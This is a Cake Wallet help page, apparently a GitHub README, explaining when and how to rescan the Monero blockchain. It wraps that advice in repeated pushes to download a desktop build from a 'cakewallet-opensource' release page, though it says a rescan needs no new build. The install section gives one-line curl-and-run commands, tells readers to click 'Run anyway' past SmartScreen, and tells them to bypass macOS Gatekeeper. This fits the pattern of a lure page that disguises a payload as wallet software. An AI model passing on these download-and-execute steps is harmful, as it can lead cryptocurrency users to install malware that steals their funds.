![Cake Wallet monero rescan guide](assets/cake-wallet-monero-rescan-article-banner.png)

# Rescan the Monero Blockchain in Cake Wallet

What a rescan rebuilds, what it costs, and when it is the wrong tool.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Open the Monero wallet, find the rescan option in its settings, and confirm. A rescan re-reads the chain from the wallet's restore height and rebuilds the local history, which can take a long time. Use it when the sync has finished but a transaction you know about is missing or a balance is wrong.

<!-- ARTICLE-BODY-BEGIN -->

## Use the current release
Rescan behaviour and its menu position change between builds, so start from the current one. Install it over your existing build and keep the wallet: the rescan you run afterwards is one the app actually supports.

Download it from the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> and let the wallet reach a completed sync first. A rescan on top of an unfinished sync tells you nothing and costs the same hours.

## When a rescan helps
A rescan is the right tool when the wallet has read the chain but its own record is wrong: a missing transaction, a balance that does not match what you sent or received, or history that stops partway. It is not a fix for a wallet that has never finished syncing, and it is not a fix for a deposit that never happened.

If the block count is still moving, the wallet is working, not broken. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-sync.md">Cake Wallet Monero sync</a> separates slow progress from a genuine stall, which decides whether a rescan is even relevant.

## The restore height decides the cost
A rescan starts reading from the wallet's stored restore height. Set too early, it reads years of blocks and can take many hours; set too late, it skips the block containing your funds and reports a wallet that is still empty.

Changing the height during a rescan is not possible; you set it before. If you know roughly when the wallet was created, that date is the height you want, and erring a little early is safer than erring late.

## Account scope
Monero accounts and subaddresses share one wallet's output set, so a rescan rebuilds all of them at once. A deposit sent to a subaddress of another account is found by the same rescan; it does not need a separate one.

That is also why the wrong account being open looks like a missing deposit. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-monero-accounts-subaddresses.md">Monero accounts and subaddresses</a> explains the three levels before you spend hours rebuilding a wallet that was fine.

## What you should see afterwards
After a completed rescan the balance and history should match the chain, and any transaction that really is yours should appear with its confirmations. Anything still missing was not sent to this wallet.

That is a useful and unwelcome answer, and it is better than another rescan. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md">Why funds are not appearing</a> covers the sender-side checks, including the transaction ID that settles the question.

## Quick triage
| Symptom | Cause | Fix |
| --- | --- | --- |
| Same balance after a rescan | The rescan has not finished | Wait for the block count to reach zero |
| Balance correct, one payment missing | It was never sent to this wallet | Check the transaction ID |
| Rescan never ends | The restore height is far too early | Set a realistic height before starting again |

A rescan does not need a new build, but if the option is missing entirely, <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">download and run the current release</a> and look again.

## FAQ
### How do I rescan Monero in Cake Wallet?
Open the wallet's settings, choose the rescan option and confirm. It rebuilds from the restore height, so expect it to take a long time.
### Will a rescan recover funds sent to the wrong address?
No. It re-reads your own wallet's history; it cannot find a payment that went elsewhere.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Cake Wallet Monero sync](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-sync.md) · [why funds are not appearing](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md) · [Monero accounts and subaddresses](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-monero-accounts-subaddresses.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
